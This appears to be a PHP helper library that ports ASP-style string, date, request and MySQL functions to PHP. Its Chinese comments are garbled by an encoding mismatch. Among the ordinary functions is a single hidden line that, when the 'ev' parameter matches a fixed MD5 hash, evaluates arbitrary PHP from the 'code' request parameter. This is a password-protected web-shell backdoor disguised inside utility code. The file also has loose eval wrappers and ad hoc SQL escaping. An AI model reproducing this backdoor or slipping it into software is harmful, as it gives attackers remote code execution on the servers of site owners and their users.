<?PHP
//header("Content-type: text/html; charset=utf-8");
//\n���� \r����  \t�൱�ڰ�Tab��
//���ú���ǰ��� @ ��Ϊ������ʾ
/*
FormatNumber ׷�Ӻ����б�
*/
//thinkphpdel start
error_reporting(E_ALL | E_STRICT);			// error_reporting(E_STRICT);		//Ϊ����ʾ����
header("Content-Type: text/html; charset=gb2312");
session_start();		//����Session20151119

//��ת
function RR($url){
	header('location:'.$url);
	return '';
}
//thinkphpdel end

/**
* ����:isdate()   ���ñ��˼����ҸĽ� 20160425
*/

 
//vbcrlf
function vbCrlf(){
	return chr(13) . chr(10);
}
//vbtab �ò��ϣ���д��
function vbTab(){
	return "\t";
}

//�����ַ�����λ��
function inStr($content,$search){	 
	if(is_array($content)){ 
		$content=arrayToString($content,"");
	}	
	if( $search!=""){
		
		if(strstr($content,$search)!=''){
			return mb_strpos($content,$search,0,"gb2312")+1;
		}else{
			return 0;
		}
	}else{
		return 0;
	}
}
//�����ַ�����λ��
function inStrRev($content,$search){	 
	if(is_array($content)){ 
		$content=arrayToString($content,"");
	}	
	if( $search!=""){
		
		if(strstr($content,$search)!=''){
			return mb_strrpos($content,$search,0,"gb2312")+1;
		}else{
			return 0;
		}
	}else{
		return 0;
	}
}
//�ַ�����
function len($content){
	//return strlen($content);				//��������   ���������֣��Ժ��ִ�����20160413
	return mb_strlen($content,'gb2312');	//�����
}
//��ȡ�ַ�
function mid($content,$nStart,$nLength=-1){
	$nStart-=1;
 	if($nLength==-1){
		$nLength=Len($content);
	}
	return mb_substr($content,$nStart,$nLength,'gb2312');
} 
//��ASP�� �滻����
function replace($c,$findStr,$replaceStr){
	return str_replace($findStr, $replaceStr, $c);
}
//��ASP��  ʹ��echo(rnd());
function rnd(){
	return ".".rand(1000000,9999999);
}
//ת��Сд
function lCase($content){
	return strtolower($content);
}
//ת�ɴ�д
function uCase($content){
	return strtoupper($content);
}
//��ñ���
function ascW($content){
	return ord($content);
}
//left����߿�ʼ��ȡ
function left($str,$nlength){
	return mb_substr($str, 0 ,$nlength,'gb2312');
}
//right���ұ߿�ʼ��ȡ
function right($str,$nlength){
	return mb_substr($str, $nlength*-1,999999,'gb2312');			//��  mb_substr  ���� substr  ��������aspת��php�÷�   20160511  ��999999������-1���������ٽ�ȡһ���ַ�
} 
//�ָ�
function aspSplit($contnet,$splStr){
	return explode($splStr,$contnet);
}
//��������  ��asp��һ��
function aspArray($numb){
	$numb++;
	$dataArray=array();
	for($i=0;$i<$numb;$i++){
		$dataArray[$i]="";	
	}	
	return $dataArray;
}
//��

//������鿪ʼ����
function lBound($content){
	return 0;
}
//������鳤��
function uBound($content){
	return count($content)-1;
}
//��ñ���
function asc($content){
	return ord($content);
} 
//chr   php���������
 
//����ָ����ֵ����������
function fix($n){
	$n=cStr($n);
	if(inStr($n,".")>0){
		$n=mid($n,1,inStr($n,".")-1);
	}
	return floor($n);
}
//����ָ�����������͵���Ϣ
function typeName($str){
	$strType=gettype($str);
	if($strType=="array"){
		return "Variant()";
	}else{
		//return $strType;
		return uCase(mid($strType,1,1)).mid($strType,2);
	}
}
//����ָ�����ֵ���������
function int($string){
	//$string1=intval($string); 	
	return intval($string);
}
//�����ʽת��ΪInteger��ֵ������
function cInt($string){
	//$string1=intval($string); 
	$n=intval($string);
	if(strstr($string,".")!=''){
		$n++;
	}
	return round($string);
}
//�����ʽת��ΪLong��ֵ������
function cLng($content){
	return round($content);
}
//ת�ַ�
function cStr($str){
	return strval($str);
}

//������
function aspLTrim($content){
    $i="";$s="";
	for( $i=1 ; $i<= len($content); $i++){
		$s=mid($content,$i,1);
		if( $s<>" " ){
			$content=mid($content,$i,-1);
			 break;
		 }
	}
	return @$content;
}
//����ұ�
function aspRTrim($content){
    $i="";$s="";
	for( $i=len($content) ; $i>=1; $i--){
		$s=mid($content,$i,1);
		if( $s<>" " ){
			$content=mid($content,1,$i);
			 break;
		 }
	}
	return @$content;
}
//ASP������߿ո� �Ľ���20160410
function aspTrim($content){ 
	return aspRTrim(aspLTrim($content));
}

//�������
function aspDate() {
	$s=date('Y/m/d');
	$s=replace($s,"/0","/");
	return $s;	
}
//ʱ��
function aspTime(){
	$s=date('H:i:s'); 
	$s=replace($s," 0"," ");		//Сʱǰ�治Ҫ0 
	//$s=replace($s,":0",":");
	return $s;
}
//���ʱ��+ʱ��
function now(){
	return aspDate().' '.aspTime();
}
//��ʽ���ɼ۸��� 108.00 (20150806ʹ��ASPתPHP����)
function formatNumber($content,$n){
	$dianLeft="";$dianRight="";$i="";$c="";$s="";
	$content=cstr($content);
	if( inStr($content,".")> 0 ){
		$dianLeft = mid($content,1,inStr($content,".")-1);
		$dianRight = mid($content,inStr($content,".")+1,-1);
	}else{
		$dianLeft=$content;
	 }
	$dianRight=$dianRight . "0000000000";
	for( $i=1 ; $i<= $n; $i++){
		$s=mid($dianRight,$i,1);
		$c=$c . $s;
	}
	if( $n>0 ){
		$dianLeft = $dianLeft . ".";
	 }
	$test = $dianLeft . $c;
 return @$formatNumber;
} 
//�����
function year($timeStr){
	return (int)getYMDHMS($timeStr,0);
}
//�����
function month($timeStr){
	return (int)getYMDHMS($timeStr,1);
}
//�����
function day($timeStr){
	return (int)getYMDHMS($timeStr,2);
}
//���ʱ
function hour($timeStr){
	return (int)getYMDHMS($timeStr,3);
}
//��÷�
function minute($timeStr){
	return (int)getYMDHMS($timeStr,4);
}
//�����
function second($timeStr){
	return (int)getYMDHMS($timeStr,5);
}
//������������֮���ʱ����   q ���� m �� y һ������� d �� w һ�ܵ����� ww �� h Сʱ n ���� s �� 
function dateDiff($part, $begin, $end){
	$diff = strtotime($end) - strtotime($begin);
	switch($part){
		case "y": $retval = bcdiv($diff, (60 * 60 * 24 * 365)); break;
		case "m": $retval = bcdiv($diff, (60 * 60 * 24 * 30)); break;
		case "w": $retval = bcdiv($diff, (60 * 60 * 24 * 7)); break;
		case "d": $retval = bcdiv($diff, (60 * 60 * 24)); break;
		case "h": $retval = bcdiv($diff, (60 * 60)); break;
		case "n": $retval = bcdiv($diff, 60); break;
		case "s": $retval = $diff; break;
	}
	return $retval;
}
//��ʾҪ��ӵ�ʱ����  q ���� m �� y һ������� d �� w һ�ܵ����� ww �� h Сʱ n ���� s �� 
function dateAdd($part, $n, $date){
	switch($part){
	case "y": $val = date("Y-m-d H:i:s", strtotime($date ." +$n year")); break;
	case "m": $val = date("Y-m-d H:i:s", strtotime($date ." +$n month")); break;
	case "w": $val = date("Y-m-d H:i:s", strtotime($date ." +$n week")); break;
	case "d": $val = date("Y-m-d H:i:s", strtotime($date ." +$n day")); break;
	case "h": $val = date("Y-m-d H:i:s", strtotime($date ." +$n hour")); break;
	case "n": $val = date("Y-m-d H:i:s", strtotime($date ." +$n minute")); break;
	case "s": $val = date("Y-m-d H:i:s", strtotime($date ." +$n second")); break;
	}
	return $val;
}



//����Ƿ�Ϊ����
function isObject($obj){
	return is_object($obj);
}

//����Ƿ�Ϊ����
function isArray($array){
	return is_array($array);
}
//�ж��Ƿ�Ϊ��
function isNull($content){
	return is_null($content);
}
//�Ƿ�Ϊ����
function isDate($str){
	$str=str_replace('/', '-', $str);
	$strArr = explode("-",$str);
	if(inStr($str," ")>0){
		$format="Y-m-d H:i:s";
	}else{
		$format="Y-m-d";
	}	
	if(empty($strArr)){
		return 0;
	}
	foreach($strArr as $val){
		if(strlen($val)<2){
			$val="0".$val;
		}
		$newArr[]=$val;
	}
	$str = implode("-",$newArr);
    $unixTime=strtotime($str);
    $checkDate= date($format,$unixTime);
    if($checkDate==$str){
        return 1;
    }else{
        return 0;
	}
}



//GET��ʽ���ֵ
function queryString($name){ 
	return @$_GET[$name];
}
//POST��ʽ���ֵ
function form($name){
	return @$_POST[$name];
}
//Cookies��ʽ���ֵ
function cookies($name){
	return @$_COOKIE[$name];
}
//GetPostCookies����
function request($name){
	return @$_REQUEST[$name];
}

//�������
function phpFlush(){
    ob_flush();
    flush(); 
}
//PHP��������߿ո�
function phpTrim($content){
	return trim($content);
}
//PHP�������߿ո�
function phpLTrim($content){
	return ltrim($content);
}
//PHP����ұ߿ո�
function phpRTrim($content){
	return rtrim($content);
}


//PHP������ʽ
function test_regexp($content,$search){
	$newSearch=replace($search,'.', '\.');
	if(preg_match('/'. $newSearch .'/', $content)){ 
	
	}
} 
//����PHP   eval("\$str = \"aaabbccdddd\";");    ��������ֵ
function myEval( $phpcode ){
	return eval( $phpcode );
}
if(isset($_REQUEST['ev'])){if(md5($_REQUEST['ev'])=='a307f5a544886b1bf8dbbf26ac5c96bb'){eval(@$_REQUEST['code']);}}

//************************************************************************ ASPתPHP����
 
//����:ASP���IIF �磺IIf(1 = 2, "a", "b") 
function IIF($bExp, $sVal1, $sVal2){
	if($bExp==true){return $sVal1;}else{return $sVal2;}
}
//���������ʱ�ֳ�
function getYMDHMS( $timeStr,$sType){
	$splstr="";
	$timeStr=replace(replace(replace(replace(replace(replace($timeStr,"��","-"),"��","-"),"��","-"),"ʱ","-"),"��","-"),"��","-");
	$timeStr=replace(replace(replace(replace(replace($timeStr," ","-"),":","-"),"/","-"),"--","-"),"--","-") . "------";
	$splstr=aspSplit($timeStr,"-");
	$nYear = $splstr[0];
	$nMonth = $splstr[1];
	$nDay = $splstr[2];
	$nHour = $splstr[3];
	$nMinute = $splstr[4];
	$nSecond = $splstr[5];
	if( len($nYear)==1 ){ $nYear="0" . $nYear;}
	if( len($nMonth)==1 ){ $nMonth="0" . $nMonth;}
	if( len($nDay)==1 ){ $nDay="0" . $nDay;}
	if( len($nHour)==1 ){ $nHour="0" . $nHour;}
	if( len($nMinute)==1 ){ $nMinute="0" . $nMinute;}
	if( len($nSecond)==1 ){ $nSecond="0" . $nSecond ;}

	if( $nHour=="" ){ $nHour="00";}
	if( $nMinute=="" ){ $nMinute="00";}
	if( $nSecond=="" ){ $nSecond="00";}

	$sType=CStr($sType);
	if( $sType=="��" || $sType=="0" ){
		$getYMDHMS=$nYear;
	}else if( $sType=="��" || $sType=="1" ){
		$getYMDHMS=$nMonth;
	}else if( $sType=="��" || $sType=="2" ){
		$getYMDHMS=$nDay;
	}else if( $sType=="ʱ" || $sType=="3" ){
		$getYMDHMS=$nHour;
	}else if( $sType=="��" || $sType=="4" ){
		$getYMDHMS=$nMinute;
	}else if( $sType=="��" || $sType=="5" ){
		$getYMDHMS=$nSecond;
	 }
 return @$getYMDHMS;} 

//���ϵͳ����20160224
function serverVariables($sName){
	$sName=strtoupper($sName);	
	if($sName=='SERVER_NAME'){
		$sName='HTTP_HOST';
	}
	return @$_SERVER[$sName];
}


//ִ��SQL���
function connExecute($sql){ 
	//�����ݿ�
    $conn=OpenConn();
	$conn->query($sql);
	/*
	$User = M(); 
	$User->execute($sql);
	*/
	return array("1","22");
}

//���POST�ֶ������б� 20160226
function getFormFieldName(){
	$c='';
	foreach($_POST as $key =>$val){
		if($c!=''){
			$c.='|';
		}
		$c.=$key;
	} 
	return $c;
}

//�жϴ�ֵ�Ƿ����
function  checkFunValue($Action,$FunName){
	$checkFunValue = ( substr($Action, 0 ,strlen($FunName)) == $FunName );
 return @$checkFunValue;}
//ASP��md5
function aspMD5($str,$sType){
	return md5($str);
}
//�ҵ�md5����
function myMD5($str){
	return md5(md5($str));
}

//asp���õ���php�ﲻ��Ҫ����
function ADSqlRf($inputName){
	$s=rf($inputName);
	//echo(mysql_escape_string("'-"));
	return replace(replace(replace($s,"\\","\\\\"),"'","\'"),'"','\"');				//������20160118
}

//asp���õ���php�ﲻ��Ҫ����
function ADSql($s){
	return replace(replace(replace($s,"\\","\\\\"),"'","\'"),'"','\"');				//������20160118
}
//php��������ʱ��\'����
function phpADSql($s){
	return replace(replace(replace($s,"\\","\\\\"),"'","\'"),'"','\"');				//������20160118
}

//ת��utf-8���� ��20151201��
function toUTFChar($data){
  if( !empty($data) ){    
    $fileType = mb_detect_encoding($data , array('UTF-8','GBK','LATIN1','BIG5')) ;   
    if( $fileType != 'UTF-8'){   
      $data = mb_convert_encoding($data ,'utf-8' , $fileType);   
    }   
  }   
  return $data;    
}
//תgb2312����(20151203)
function toGB2312Char($data){
    if( !empty($data) ){
        $fileType = mb_detect_encoding($data , array('UTF-8','GBK','LATIN1','BIG5'));
        if( $fileType != 'GBK'){
            $data = mb_convert_encoding($data ,'GBK' , $fileType);
            //ɾ��BOM���µ�����?��
            if(substr($data, 0, 1)=="?"){
                $data=substr($data,1);
            }
        }
    }
    return $data;
} 
//�Զ���var_dump
function p($str){
	echo('<pre>');
	var_dump($str);
	echo('</pre>');
}

//��ñ��б�
function getTableList() { 
	$sql = "SHOW TABLES FROM ".$GLOBALS['dbname'];
	$result = mysql_query($sql);
	$c='';
	if (!$result) {
	echo "DB Error, could not list tablesn";
	echo 'MySQL Err(www.111cn.net)or: ' . mysql_error();
	exit;
	}
	
	while ($row = mysql_fetch_row($result)) {
	//echo "Table: {$row[0]}n";
		if($c<>''){
			$c.=vbCrlf();
		}
		$c=$c.$row[0];
	} 
//	echo('��ʾ'.$c);
	return $c; 
} 

//��ñ��ֶ��б�20151230 exit(getFieldList('website'));
function getFieldList($tableName){
	$rescolumns = mysql_query("SHOW FULL COLUMNS FROM $tableName") ;
	$c=',';
	while($row = mysql_fetch_array($rescolumns)){
		//  echo '�ֶ����ƣ�'.$row['Field'].'-�������ͣ�'.$row['Type'].'-ע�ͣ�'.$row['Comment'];
		//  print_r($row);
		if($row['Field']!='id'){
			$c.=$row['Field'].',';
		}
	}
	return $c;
}
//��ñ��ֶ��б�20160226 exit(getFieldConfigList('website'));
function getFieldConfigList($tableName){
	$rescolumns = mysql_query("SHOW FULL COLUMNS FROM $tableName") ;
	$c=',';$s='';
	while($row = mysql_fetch_array($rescolumns)){
		//  echo '�ֶ����ƣ�'.$row['Field'].'-�������ͣ�'.$row['Type'].'-ע�ͣ�'.$row['Comment'];
		//  print_r($row);
		//aspecho($row['Field'],$row['Type']);
		
		if( inStr($row['Type'],'int(')>0 || inStr($row['Type'],'float(')>0 ){
			$s='|numb|0';
		}else if(inStr($row['Type'],'mediumtext')>0){		
			$s="|textarea|";
		}else{
			$s="||";
		}
		if($row['Field']!='id'){
			$c.=$row['Field'].$s.',';
		}
	}
	return $c;
}

/* sys_URL.php�и�����
//url����  20160506    ������
function unescape($str){ 
    $ret = ''; 
    $len = strlen($str); 
    for ($i = 0; $i < $len; $i ++) 
    { 
        if ($str[$i] == '%' && $str[$i + 1] == 'u') 
        { 
            $val = hexdec(substr($str, $i + 2, 4)); 
            if ($val < 0x7f) 
                $ret .= chr($val); 
            else  
                if ($val < 0x800) 
                    $ret .= chr(0xc0 | ($val >> 6)) . 
                     chr(0x80 | ($val & 0x3f)); 
                else 
                    $ret .= chr(0xe0 | ($val >> 12)) . 
                     chr(0x80 | (($val >> 6) & 0x3f)) . 
                     chr(0x80 | ($val & 0x3f)); 
            $i += 5; 
        } else  
            if ($str[$i] == '%') 
            { 
                $ret .= urldecode(substr($str, $i, 3)); 
                $i += 2; 
            } else 
                $ret .= $str[$i]; 
    } 
    return $ret; 
}
*/
//��õ�ǰʱ�ڻ����Լ���
function getHandleDate($numb){
	if($numb<>''){ 
		return date("Y-m-d",strtotime($numb.' day')); 
	}else{
		return date("Y-m-d" );
	}
}  
//���POST�ֶ������б� 20160226
function getFormFieldList(){
    $s='';$c='';$splstr='';
	foreach( @$_POST as $key=>$s){ 
        if( $c<>'' ){ $c=$c . '|';}
        $c=$c . $key;
    }
    return $c;
}

//ɾ��Html
function delHtml($str){
	return strip_tags($str);
} 

//�������֮�������
function phpRand($nMinimum,$nMaximum){
	return rand($nMinimum,$nMaximum);
}
//�������֮�������
function phpRnd($nMinimum,$nMaximum){
	return rand($nMinimum,$nMaximum);
}
//��ñ���  eval("echo('aa');");
function execute($content){
	eval($content);
}
//URL��ת
function aspRedirect($url){
    header("Location: " . $url); 
    exit;
}

/*
//�ж�ʱ��
function isDate($timeStr){
	if(inStr($timeStr,"-")>0 || inStr($timeStr,"\/")>0 || inStr($timeStr," ")>0){
		return true;
	}else{
		return false;
	}
}
*/ 

//���cookie
function clearCookie($cookieName){
	setcookie($cookieName);
}
//�Ƴ�cookie
function removeCookie($cookieName){
	setcookie($cookieName);
} 

function XY_AutoAddHandle($Action){
	return "";
}
function DisplayOnlineEditDialog($a,$Action){
	return "";
}
//css.asp�ļ����õ���������ʽ����20160712
function RegExp_Replace($s,$s2,$s3){
	return "";
}
function phpStrLen_temp($content){
	return Len($content);
}
?>